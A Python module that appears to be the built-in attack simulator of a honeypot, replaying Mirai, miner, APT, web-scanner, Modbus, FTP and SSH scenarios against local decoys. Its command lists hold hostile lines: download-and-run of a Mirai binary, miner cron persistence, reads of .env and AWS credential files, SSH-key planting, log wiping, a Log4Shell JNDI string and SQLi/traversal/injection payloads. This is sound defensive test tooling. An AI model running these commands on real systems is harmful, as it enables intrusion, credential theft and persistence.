"""Built-in attack simulator (lab mode). Generates realistic attacker behaviour against the
local decoys so the whole pipeline can be evaluated without exposing anything to the internet.
Simulated attackers use the reserved benchmarking range 198.18.0.0/15 as their source address."""
import random
import socket
import struct
import threading
import time
import urllib.request

SCENARIOS = {
    "mirai_bot": {"label": "IoT botnet (Mirai-style)", "sensor": "telnet",
                  "desc": "Fast default-credential brute force, BusyBox probing and payload download."},
    "miner_kiddie": {"label": "Crypto-miner script kiddie", "sensor": "telnet",
                     "desc": "Logs in, checks CPU, downloads a miner, adds cron persistence."},
    "apt_operator": {"label": "Skilled operator (APT-style)", "sensor": "telnet",
                     "desc": "Slow, careful recon, credential hunting, SSH-key persistence, log wiping."},
    "web_scanner": {"label": "Web vulnerability scanner", "sensor": "http",
                    "desc": "Enumerates paths and fires SQLi / XSS / traversal / Log4Shell payloads."},
    "web_intruder": {"label": "Targeted web intruder", "sensor": "http",
                     "desc": "Reads leaked .env, then re-uses the canary credential on the login page."},
    "ics_probe": {"label": "ICS / Modbus attacker", "sensor": "modbus",
                  "desc": "Reads PLC registers, identifies the device, then writes a setpoint."},
    "ftp_brute": {"label": "FTP brute-forcer", "sensor": "ftp",
                  "desc": "Tries common credentials, lists files and attempts an upload."},
    "ssh_scanner": {"label": "SSH version scanner", "sensor": "ssh",
                    "desc": "Mass-scanner grabbing the SSH banner (like zgrab / masscan)."},
}


def sim_ip():
    return f"198.{random.choice([18, 19])}.{random.randint(0, 255)}.{random.randint(1, 254)}"


class Simulator:
    def __init__(self, core):
        self.core = core
        self.campaign = False
        self.campaign_rate = 6  # attacks per minute
        self.runs = 0
        self.running = 0
        self.last = []
        self.lock = threading.Lock()

    def port(self, sensor):
        return int(self.core.db.get("ports")[sensor])

    # ------------------------------------------------------------------ public API
    def run(self, scenario, wait=False):
        if scenario == "random":
            scenario = random.choice(list(SCENARIOS))
        if scenario not in SCENARIOS:
            raise ValueError("unknown scenario")
        ip = sim_ip()
        t = threading.Thread(target=self._run, args=(scenario, ip), daemon=True)
        t.start()
        if wait:
            t.join(120)
        return {"scenario": scenario, "ip": ip, "label": SCENARIOS[scenario]["label"]}

    def set_campaign(self, on, rate=None):
        if rate:
            self.campaign_rate = max(1, min(60, int(rate)))
        if on and not self.campaign:
            self.campaign = True
            threading.Thread(target=self._campaign_loop, daemon=True).start()
        elif not on:
            self.campaign = False

    def status(self):
        return {"campaign": self.campaign, "rate": self.campaign_rate, "runs": self.runs, "running": self.running,
                "recent": self.last[-10:], "scenarios": SCENARIOS}

    # ------------------------------------------------------------------ internals
    def _campaign_loop(self):
        while self.campaign:
            if self.running < 8:
                self.run("random")
            time.sleep(60.0 / self.campaign_rate * random.uniform(0.6, 1.4))

    def _run(self, scenario, ip):
        with self.lock:
            self.running += 1
            self.runs += 1
        ok, err = True, ""
        try:
            getattr(self, "_" + scenario)(ip)
        except Exception as e:
            ok, err = False, str(e)[:120]
        finally:
            with self.lock:
                self.running -= 1
                self.last.append({"ts": time.time(), "scenario": scenario, "ip": ip, "ok": ok, "error": err})
                self.last = self.last[-50:]

    def _connect(self, sensor, ip):
        s = socket.create_connection(("127.0.0.1", self.port(sensor)), timeout=20)
        s.sendall(f"PROXY TCP4 {ip} 127.0.0.1 {random.randint(30000, 65000)} {self.port(sensor)}\r\n".encode())
        return s

    @staticmethod
    def _read_until(s, marks, timeout=8):
        s.settimeout(timeout)
        buf = b""
        end = time.time() + timeout
        while time.time() < end:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
            text = buf.decode(errors="ignore")
            if any(m in text for m in marks):
                break
        return buf.decode(errors="ignore")

    def _shell(self, ip, creds, cmds, gap):
        s = self._connect("telnet", ip)
        try:
            self._read_until(s, ["login:"])
            logged = False
            for u, p in creds:
                s.sendall(f"{u}\r\n".encode())
                self._read_until(s, ["Password:"])
                s.sendall(f"{p}\r\n".encode())
                out = self._read_until(s, ["# ", "$ ", "incorrect"])
                if "incorrect" not in out and ("# " in out or "$ " in out):
                    logged = True
                    break
                self._read_until(s, ["login: "], timeout=3)
                time.sleep(gap[0])
            if not logged:
                return
            for c in cmds:
                time.sleep(random.uniform(*gap))
                s.sendall((c + "\r\n").encode())
                self._read_until(s, ["# ", "$ ", "logout"], timeout=6)
        finally:
            s.close()

    def _mirai_bot(self, ip):
        creds = [("root", "xc3511"), ("admin", "1111"), ("root", "vizxv")]
        cmds = ["enable", "system", "shell", "sh", "/bin/busybox ECCHI", "cat /proc/cpuinfo",
                f"cd /tmp; wget http://{sim_ip()}/bins/mirai.arm7 -O .x; chmod 777 .x; ./.x telnet.arm7", "/bin/busybox ECCHI"]
        self._shell(ip, creds, cmds, (0.05, 0.15))

    def _miner_kiddie(self, ip):
        creds = [("root", "admin123"), ("root", "root")]
        pool = random.choice(["pool.minexmr-lab.xyz", "xmr.lab-pool.top"])
        cmds = ["uname -a", "nproc", "cat /proc/cpuinfo | grep name", "lscpu", "free -m",
                f"wget http://{pool}/xmrig.tar.gz", "tar xzf xmrig.tar.gz", "chmod +x xmrig",
                f"./xmrig -o stratum+tcp://{pool}:3333 -u 4AbCdEf -p x --background", "xmrigg", "crontab -l",
                "(crontab -l; echo '* * * * * /root/xmrig') | crontab -", "exit"]
        self._shell(ip, creds, cmds, (0.4, 1.0))

    def _apt_operator(self, ip):
        creds = [("deploy", "Summer2026!"), ("root", "P@ssw0rd"), ("root", "Winter#2026")]
        cmds = ["id", "w", "uname -a", "cat /etc/os-release", "ss -tulpn", "ps aux", "sudo -l", "ls -la /var/www/html",
                "cat /var/www/html/.env", "cat /root/.aws/credentials", "find / -perm -4000 2>/dev/null",
                "mkdir -p /root/.ssh", "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIRoseLabKey op@kali' >> /root/.ssh/authorized_keys",
                "cat /etc/passwd", "history -c", "unset HISTFILE", "exit"]
        self._shell(ip, creds, cmds, (0.9, 2.0))

    def _http(self, ip, method, path, ua, body=None):
        url = f"http://127.0.0.1:{self.port('http')}{path}"
        data = body.encode() if body else None
        req = urllib.request.Request(url, data=data, method=method, headers={
            "User-Agent": ua, "X-Sim-Source": ip, "Content-Type": "application/x-www-form-urlencoded"})
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.read().decode(errors="ignore")
        except Exception as e:
            return getattr(e, "read", lambda: b"")().decode(errors="ignore") if hasattr(e, "read") else ""

    def _web_scanner(self, ip):
        ua = random.choice(["sqlmap/1.8.4#stable (https://sqlmap.org)", "Mozilla/5.00 (Nikto/2.5.0)",
                            "Mozilla/5.0 zgrab/0.x", "python-requests/2.32.3"])
        paths = ["/", "/robots.txt", "/admin", "/wp-login.php", "/phpmyadmin", "/.git/config", "/.env",
                 "/login?id=1'%20OR%20'1'='1", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
                 "/download?file=../../../../etc/passwd", "/api/v1/status?x=${jndi:ldap://198.18.7.7:1389/a}",
                 "/cgi-bin/ping?host=127.0.0.1;cat%20/etc/passwd", "/backup/", "/manager/html"]
        for p in paths:
            self._http(ip, "GET", p, ua)
            time.sleep(random.uniform(0.05, 0.2))

    def _web_intruder(self, ip):
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36"
        self._http(ip, "GET", "/", ua)
        time.sleep(1.2)
        self._http(ip, "GET", "/robots.txt", ua)
        time.sleep(1.5)
        env = self._http(ip, "GET", "/.env", ua)
        time.sleep(2.0)
        self._http(ip, "GET", "/backup/", ua)
        time.sleep(1.5)
        pw = "Rose#Canary2026!" if "DB_PASSWORD" in env else "admin"
        self._http(ip, "POST", "/login", ua, f"username=admin&password={urllib.request.quote(pw)}")

    def _ics_probe(self, ip):
        s = self._connect("modbus", ip)
        try:
            tid = 1
            def req(pdu):
                nonlocal tid
                s.sendall(struct.pack(">HHHB", tid, 0, len(pdu) + 1, 1) + pdu)
                tid += 1
                s.settimeout(5)
                return s.recv(512)
            for addr in (0, 10, 20):
                req(struct.pack(">BHH", 3, addr, 10))
                time.sleep(random.uniform(0.3, 0.8))
            req(bytes([43, 14, 1, 0]))
            time.sleep(1.0)
            req(struct.pack(">BHH", 1, 0, 8))
            time.sleep(1.0)
            req(struct.pack(">BHH", 6, 12, 9999))
            req(struct.pack(">BHH", 5, 3, 0xFF00))
        finally:
            s.close()

    def _ftp_brute(self, ip):
        s = self._connect("ftp", ip)
        try:
            self._read_until(s, ["220"])
            for u, p in [("admin", "admin123"), ("ftp", "ftp"), ("admin", "password1"), ("root", "root")]:
                s.sendall(f"USER {u}\r\n".encode())
                self._read_until(s, ["331"])
                s.sendall(f"PASS {p}\r\n".encode())
                if "230" in self._read_until(s, ["230", "530"]):
                    break
                time.sleep(0.1)
            for c in ["SYST", "PWD", "PASV", "LIST", "RETR backup_2026-10-27.sql.gz", "STOR shell.php", "QUIT"]:
                s.sendall((c + "\r\n").encode())
                self._read_until(s, ["\r\n"], timeout=3)
                time.sleep(0.2)
        finally:
            s.close()

    def _ssh_scanner(self, ip):
        s = self._connect("ssh", ip)
        try:
            self._read_until(s, ["SSH-"], timeout=5)
            s.sendall(random.choice([b"SSH-2.0-Go\r\n", b"SSH-2.0-libssh2_1.10.0\r\n", b"SSH-2.0-paramiko_3.4.0\r\n"]))
            time.sleep(0.2)
            s.sendall(b"\x00\x00\x01\x2c\x0a\x14" + bytes(random.getrandbits(8) for _ in range(64)))
        finally:
            s.close()
